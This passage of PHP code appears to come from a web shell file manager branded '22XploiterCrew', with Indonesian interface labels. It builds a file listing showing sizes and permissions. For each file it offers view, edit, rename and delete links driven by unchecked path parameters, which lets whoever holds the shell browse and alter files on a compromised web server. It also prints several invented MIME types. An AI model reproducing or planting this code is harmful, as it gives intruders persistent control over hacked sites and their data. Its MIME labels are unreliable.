					}elseif ($ext == "py") {
						echo 'application/octet-stream';
					}elseif ($ext == "sql") {
						echo 'application/octet-stream';
					}elseif ($ext == "pl") {
						echo 'application/octet-stream';
					}elseif ($ext == "pdf") {
						echo 'dokumen/pdf';
					}elseif ($ext == "mp4") {
						echo 'media/mp4';
					}elseif ($ext == "mp3") {
						echo 'media/mp3';
					}elseif ($ext == "git") {
						echo 'application/octet-stream';
					}elseif ($ext == "md") {
						echo 'application/octet-stream';
					}else{
						echo 'dokumen/docs';
					}
					echo '</td>
					<td><center>'.$size.'</center></td>
					<td><center>';
					if(is_writable($path.'/'.$file)) echo '<font color="#00ff00">';
					elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
					echo perms($path.'/'.$file);
					if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>
					<td class="text-center">
						<a title="Lihat" class="badge" href="?dir='.$path.'&aksi=view&dirf='.$path.'/'.$file.'">Lihat</a>
						<a title="Edit" class="badge" href="?dir='.$path.'&aksi=edit&dirf='.$path.'/'.$file.'">Edit</a>
						<a title="Edit" class="badge" href="?dir='.$path.'&aksi=rename&dirf='.$path.'/'.$file.'">Ubah Nama</a>
						<a class="badge" href="?dir='.$path.'&aksi=hapusf&dirf='.$path.'/'.$file.'" title="Delete">Hapus</a>
					</td>
				</tr>';
			};
		echo '</table></div><hr/>';
		echo "<a href='' class='scrollToTop'><i class='fas fa-arrow-up up'></i></a>";
		echo '<center><small>Copyright all right reserved '.date('M-Y').' <a href="https://22xploitercrew.com">22XploiterCrew</a></small></center>';
?>
